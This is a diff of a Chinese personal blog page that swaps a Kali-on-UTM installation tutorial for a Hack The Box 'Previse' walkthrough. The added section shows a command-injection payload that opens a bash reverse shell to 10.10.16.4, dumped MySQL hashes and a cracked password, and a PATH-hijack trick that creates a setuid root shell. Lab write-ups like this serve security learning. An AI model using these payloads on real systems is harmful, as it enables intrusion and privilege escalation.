@@ -9,7 +9,7 @@
     
     <title>
         
-            Macbook M系统芯片用UTM安装最新kali linux |
+            htb previse复盘 |
         
         Flowww&#39;s blog
     </title>
@@ -191,7 +191,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        Macbook M系统芯片用UTM安装最新kali linux
+                        htb previse复盘
                     </div>
                 
 
@@ -217,12 +217,12 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2024-09-11</span>
+                <span class="datetime">2024-09-13</span>
             </span>
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Wed Sep 11 2024 12:32:22 GMT+0800">2024-09-11</span>
+                <span class="datetime" data-updated="Fri Sep 13 2024 10:46:06 GMT+0800">2024-09-13</span>
             </span>
         
 
@@ -232,10 +232,13 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%95%99%E7%A8%8B/">教程</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/htb/">htb</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
                         
                     
                 </ul>
@@ -263,45 +266,45 @@
                 <div class="post-content keep-markdown-body">
                     
 
-                    <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这两天偶然一个契机想装个最新的kali，找到官网的教程装起来很轻松。回想刚开始接触装虚拟机的时候起码折腾一星期，所以就像写个博客记录一下，如果有人看到有被帮助到，那就更好了，希望你能少踩点坑吧。</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.kali.org/docs/virtualization/install-utm-guest-vm/" >官方参考文档<i class="fas fa-external-link-alt"></i></a></p>
-<h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>UTM：找到<a class="link"   target="_blank" rel="noopener" href="https://mac.getutm.app/" >官网<i class="fas fa-external-link-alt"></i></a>下载安装即可</p>
-<p>Kali镜像：<a class="link"   target="_blank" rel="noopener" href="https://www.kali.org/get-kali/#kali-installer-images" >镜像地址<i class="fas fa-external-link-alt"></i></a></p>
-<p>记得选择这个Apple sllicon的，中间recommend那个就行</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911113834.png" ></p>
-<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>在UTM找到“新建”添加一个虚拟机，<strong>选择“虚拟化”-&gt;“其他”</strong></p>
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911114826.png"   style="zoom:50%;" >
+                    <h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">─# nmap -A -p- --min-rate=1000 -T4 10.10.11.104</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 19:03 PDT</span><br><span class="line">Nmap scan report for 10.10.11.104</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)</span><br><span class="line">|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)</span><br><span class="line">|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-title: Previse Login</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=9/12%OT=22%CT=1%CU=42757%PV=Y%DS=2%DC=T%G=Y%TM=66E3</span><br><span class="line">OS:9E0F%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A</span><br><span class="line">OS:)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53A</span><br><span class="line">OS:ST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1</span><br><span class="line">OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O</span><br><span class="line">OS:=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N</span><br><span class="line">OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=</span><br><span class="line">OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF</span><br><span class="line">OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=</span><br><span class="line">OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   414.58 ms 10.10.16.1</span><br><span class="line">2   587.74 ms 10.10.11.104</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 165.33 seconds</span><br></pre></td></tr></table></figure>
 
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115935.png"   style="zoom:50%;" >
+<p>只有22和80端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100648.png" ></p>
+<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>先访问80端口，只有一个登陆口，尝试了密码爆破和sql注入，都不成功，后面看的官方对机器的描述是关于重定向的，扫到的nav.php，点到其他php都会定向会login.php。看一下bp历史包</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100810.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100944.png" ></p>
+<p>可以看到返回包里有accounts.php的详细内容，但是状态码是302，我们尝试bp抓包后”Do interact”，修改返回包的状态码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101145.png" ></p>
+<p>这下就不会被重定向到login.php，可以看到正常的account页面</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101238.png" ></p>
+<p>我们在这里新建一个用户，再正常登陆，登陆后就不会被重定向了</p>
+<p>然后再download.php找到一个可以下载的压缩包<code>SITEBACKUP.zip</code>，下载下来是网站的源码，config.php可以看到mysql登陆账号密码，后面可以用，经过一番搜寻，在logs.php里面发现<code>exec</code>函数，里面的变量可控，大概率存在代码注入漏洞</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101933.png" ></p>
+<p>找到导出log的php，抓到包</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913102148.png" ></p>
+<p>改变一下delim变量值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delim=%3bbash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/10.10.16.4/1234+0&gt;%261&#x27;%3b</span><br></pre></td></tr></table></figure>
 
-<p>在第三个页面点击“浏览”，把我们下载的kali镜像挂上去</p>
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115109.png"   style="zoom:50%;" >
+<p>成功反弹shell</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>拿到第一反应是先登陆mysql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@previse:/var/www/html$ mysql -u root -p&#x27;mySQL_p@ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">&lt;ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">id      username        password        created_at</span><br><span class="line">1       m4lwhere        $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.        2021-05-27 18:18:36</span><br><span class="line">2       admin   $1$🧂llol$G3KunFyMrVvsqYP1JpRi70        2024-09-13 02:06:23</span><br></pre></td></tr></table></figure>
 
-<p>接下来就一直点击“继续”，可以根据自己的需要调整内存和CPU核数量</p>
-<p>到虚拟机设置完成，我们还需要编辑一下一些配置</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115415.png" ></p>
-<p>我们需要在这里添加一个serial</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115450.png" ></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115651.png" ></p>
-<p>然后<strong>保存</strong>即可，启动虚拟机进行一些配置</p>
-<h4 id="Kali初始配置"><a href="#Kali初始配置" class="headerlink" title="Kali初始配置"></a>Kali初始配置</h4><p>虚拟机启动后就能看到选择，这里我选择了图形化安装</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120052.png" ></p>
-<p>语言选English</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120149.png" ></p>
-<p>时区建议选择Hong Kong</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120217.png" ></p>
-<p>键盘也是选美式的</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120243.png" ></p>
-<p>接下来就是个性化制定你的用户名和机子的名字了，自己选吧</p>
-<p>填完一些了个性化名字，到了这里我选择第一个</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120656.png" ></p>
-<p>接下来就是一路选择yes&#x2F;continue就行，等待虚拟机自己加载</p>
-<p>经过漫长的等待，到看到这个页面就可以了，选择continue到出现黑屏的时候把虚拟机关闭</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911122515.png" ></p>
-<p>然后回到UTM打开虚拟机编辑，把之前挂载的iso和serial给删了，再到这个“显示”</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911122841.png" ></p>
-<p>把选项改成’virtio-gpu-pci’，再保存启动虚拟机，正常输入你之前设置的账号密码，正常开机，大功告成！</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911123136.png" ></p>
+<p>拿到 <code>m4lwhere</code>的加盐密码，还要看到他是什么类型的哈希</p>
+<p>然后在accounts.php源码找到存储逻辑</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913103416.png" ></p>
+<p>Crypt()函数，md5加密来的，于是指定john的爆破格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt --format=md5crypt-long</span><br></pre></td></tr></table></figure>
+
+<p>最后拿到密码<code>ilovecody112235!</code>登陆m4lwhere</p>
+<p>第一件事sudo -l，找到一个可以用的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">m4lwhere@previse:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> m4lwhere: </span><br><span class="line">User m4lwhere may run the following commands on previse:</span><br><span class="line">    (root) /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">ls</span> -l /opt/scripts/access_backup.sh</span><br><span class="line">-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">cat</span> /opt/scripts/access_backup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We always make sure to store logs, we take security SERIOUSLY here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span></span><br><span class="line"><span class="comment"># This is configured to run with cron, added to sudo so I can run as needed - we&#x27;ll fix it later when there&#x27;s time</span></span><br><span class="line"></span><br><span class="line">gzip -c /var/log/apache2/access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_access.gz</span><br><span class="line">gzip -c /var/www/file_access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_file_access.gz</span><br></pre></td></tr></table></figure>
+
+<p>没有修改权限，第一反应是修改环境变量，里面用到gzip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">&#x27;#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash&#x27;</span> &gt; gzip</span><br><span class="line"><span class="built_in">chmod</span> +x gzip</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">sudo /opt/scripts/access_backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913104313.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>真感觉htb质量高，难度适中，什么知识点都需要，最开始重定向分析那个算是基础，这次复盘下来也是加深了印象，拿到源码后审计这块真需要耐心。。。</p>
 
                 </div>
                 
@@ -312,11 +315,15 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%95%99%E7%A8%8B/">教程</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/htb/">htb</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/linux/">linux</a>
                                     </li>
                                 
                             </ul>
@@ -335,14 +342,14 @@
                             <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
-                                   href="/2024/09/11/htb-OpenSource%E5%A4%8D%E7%9B%98/"
-                                   title="htb OpenSource复盘"
+                                   href="/2024/09/13/htb-Shoppy%E5%A4%8D%E7%9B%98/"
+                                   title="htb Shoppy复盘"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">htb OpenSource复盘</span>
+                                        <span class="post-nav-title-item text-ellipsis">htb Shoppy复盘</span>
                                         <span class="post-nav-item">上一篇</span>
                                     </span>
                                 </a>
@@ -352,11 +359,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/09/04/9-4%E5%9B%9E%E6%A0%A1%E5%B0%8F%E8%AE%B0/"
-                                   title="9.4回校小记"
+                                   href="/2024/09/11/htb-OpenSource%E5%A4%8D%E7%9B%98/"
+                                   title="htb OpenSource复盘"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">9.4回校小记</span>
+                                        <span class="post-nav-title-item text-ellipsis">htb OpenSource复盘</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -384,7 +391,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">3.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kali%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE"><span class="nav-number">4.</span> <span class="nav-text">Kali初始配置</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
@@ -547,7 +554,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">3.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kali%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE"><span class="nav-number">4.</span> <span class="nav-text">Kali初始配置</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
